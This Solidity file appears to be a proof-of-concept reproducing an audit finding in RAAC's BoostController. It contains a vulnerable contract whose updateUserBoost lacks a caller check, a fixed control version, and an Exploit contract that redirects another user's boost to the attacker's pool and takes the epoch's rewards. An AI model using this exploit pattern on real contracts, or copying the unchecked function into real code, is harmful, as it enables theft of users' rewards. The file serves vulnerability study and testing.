// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  RAAC BoostController.updateUserBoost (CodeHawks, 2025-02) has no
    caller check. Anyone can write another user's boost onto a pool.
    Alice's 1000 ve is forced onto the attacker's pool, her own
    delegateBoost reverts BoostAlreadyDelegated, and the epoch's
    1000 reward tokens are paid to the attacker. The control allows
    the call only from the user, and Alice's pool receives the reward.
*/

contract Token {
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _symbol) {
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Alice {
    function tryDelegate(BoostController c, address pool) external returns (bool ok) {
        try c.delegateBoost(pool, 10_000, 7 days) {
            ok = true;
        } catch {
            ok = false;
        }
    }

    function delegate(BoostController c, address pool) external {
        c.delegateBoost(pool, 10_000, 7 days);
    }

    function delegateFixed(BoostControllerFixed c, address pool) external {
        c.delegateBoost(pool, 10_000, 7 days);
    }
}

contract BoostController {
    error BoostAlreadyDelegated();

    struct PoolBoost {
        uint256 totalBoost;
    }

    Token public ve;
    Token public reward;
    mapping(address => mapping(address => uint256)) public userBoost;
    mapping(address => PoolBoost) public poolBoost;
    mapping(address => address) public delegatedPool;
    mapping(address => bool) public supportedPools;

    constructor(Token _ve, Token _reward) {
        ve = _ve;
        reward = _reward;
    }

    function support(address pool) external {
        supportedPools[pool] = true;
    }

    function _calculateBoost(address user, address) internal view returns (uint256) {
        return ve.balanceOf(user);
    }

    function updateUserBoost(address user, address pool) public {
        require(supportedPools[pool], "pool");
        uint256 newBoost = _calculateBoost(user, pool);
        uint256 oldBoost = userBoost[pool][user];
        if (newBoost >= oldBoost) {
            poolBoost[pool].totalBoost += (newBoost - oldBoost);
        } else {
            poolBoost[pool].totalBoost -= (oldBoost - newBoost);
        }
        // @> VULN: updateUserBoost has no caller check, so this write redirects any user's boost to any pool
        userBoost[pool][user] = newBoost;
        if (newBoost > 0) {
            delegatedPool[user] = pool;
        }
    }

    function delegateBoost(address pool, uint256, uint256) external {
        if (delegatedPool[msg.sender] != address(0)) revert BoostAlreadyDelegated();
        require(supportedPools[pool], "pool");
        delegatedPool[msg.sender] = pool;
        uint256 newBoost = _calculateBoost(msg.sender, pool);
        userBoost[pool][msg.sender] = newBoost;
        poolBoost[pool].totalBoost += newBoost;
    }

    function payRewards(address poolA, address poolB) external {
        uint256 amount = reward.balanceOf(address(this));
        uint256 sum = poolBoost[poolA].totalBoost + poolBoost[poolB].totalBoost;
        uint256 toB = (amount * poolBoost[poolB].totalBoost) / sum;
        uint256 toA = amount - toB;
        if (toA > 0) reward.transfer(poolA, toA);
        if (toB > 0) reward.transfer(poolB, toB);
    }
}

contract BoostControllerFixed {
    error BoostAlreadyDelegated();

    struct PoolBoost {
        uint256 totalBoost;
    }

    Token public ve;
    Token public reward;
    mapping(address => mapping(address => uint256)) public userBoost;
    mapping(address => PoolBoost) public poolBoost;
    mapping(address => address) public delegatedPool;
    mapping(address => bool) public supportedPools;

    constructor(Token _ve, Token _reward) {
        ve = _ve;
        reward = _reward;
    }

    function support(address pool) external {
        supportedPools[pool] = true;
    }

    function _calculateBoost(address user, address) internal view returns (uint256) {
        return ve.balanceOf(user);
    }

    function updateUserBoost(address user, address pool) public {
        require(msg.sender == user, "auth");
        require(supportedPools[pool], "pool");
        uint256 newBoost = _calculateBoost(user, pool);
        uint256 oldBoost = userBoost[pool][user];
        if (newBoost >= oldBoost) {
            poolBoost[pool].totalBoost += (newBoost - oldBoost);
        } else {
            poolBoost[pool].totalBoost -= (oldBoost - newBoost);
        }
        userBoost[pool][user] = newBoost;
        if (newBoost > 0) {
            delegatedPool[user] = pool;
        }
    }

    function delegateBoost(address pool, uint256, uint256) external {
        if (delegatedPool[msg.sender] != address(0)) revert BoostAlreadyDelegated();
        require(supportedPools[pool], "pool");
        delegatedPool[msg.sender] = pool;
        uint256 newBoost = _calculateBoost(msg.sender, pool);
        userBoost[pool][msg.sender] = newBoost;
        poolBoost[pool].totalBoost += newBoost;
    }

    function payRewards(address poolA, address poolB) external {
        uint256 amount = reward.balanceOf(address(this));
        uint256 sum = poolBoost[poolA].totalBoost + poolBoost[poolB].totalBoost;
        uint256 toB = (amount * poolBoost[poolB].totalBoost) / sum;
        uint256 toA = amount - toB;
        if (toA > 0) reward.transfer(poolA, toA);
        if (toB > 0) reward.transfer(poolB, toB);
    }
}

contract Exploit {
    address public constant POOL_A = address(uint160(0xA11A));
    uint256 public constant BOOST = 1000 ether;
    uint256 public constant REWARD = 1000 ether;

    Token public ve;
    Token public reward;
    BoostController public controller;
    Alice public alice;
    bool public aliceDelegated;
    uint256 public attackerReward;

    constructor() {
        ve = new Token("veRAAC");
        reward = new Token("RAAC");
        controller = new BoostController(ve, reward);
        alice = new Alice();
        controller.support(POOL_A);
        controller.support(address(this));
        ve.mint(address(alice), BOOST);
    }

    function run() external {
        reward.mint(address(controller), REWARD);
        controller.updateUserBoost(address(alice), address(this));
        aliceDelegated = alice.tryDelegate(controller, POOL_A);
        uint256 forced = controller.userBoost(address(this), address(alice));
        controller.payRewards(POOL_A, address(this));
        attackerReward = reward.balanceOf(address(this));
        require(forced == BOOST, "forced");
        require(controller.delegatedPool(address(alice)) == address(this), "redirected");
        require(!aliceDelegated, "alice");
        require(reward.balanceOf(POOL_A) == 0, "poolA");
        require(attackerReward == REWARD, "stolen");
    }
}
